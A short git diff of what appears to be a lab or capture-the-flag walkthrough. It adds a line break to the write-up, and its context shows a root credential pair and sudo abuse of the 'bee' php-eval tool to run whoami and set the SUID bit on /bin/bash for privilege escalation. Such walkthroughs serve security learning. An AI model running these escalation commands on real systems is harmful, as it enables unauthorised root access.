@@ -37,7 +37,7 @@ Creds -> root:BackDropJ2024DS2024 <br>
 ![image](https://github.com/user-attachments/assets/9082faf4-c68f-4e82-b557-3c5e45bfb417)
 17. Try to run whoami with this command. <br>
 **Command: sudo /usr/local/bin/bee --root=/var/www/html/ php-eval "system("whoami")"** <br>
-<img width="518" alt="image" src="https://github.com/user-attachments/assets/e292cce6-f607-406b-8ecd-ce97c0d65a56" />
+<img width="518" alt="image" src="https://github.com/user-attachments/assets/e292cce6-f607-406b-8ecd-ce97c0d65a56" /> <br>
 18. It works! Now I'm able to change the /bin/bash privilege into SUID. <br>
 **Command: sudo /usr/local/bin/bee --root=/var/www/html/ php-eval "system('chmod u+s /bin/bash')"** <br>
 ![image](https://github.com/user-attachments/assets/5c2d3c71-3f6e-47ea-9dc9-b6c3025814a9)
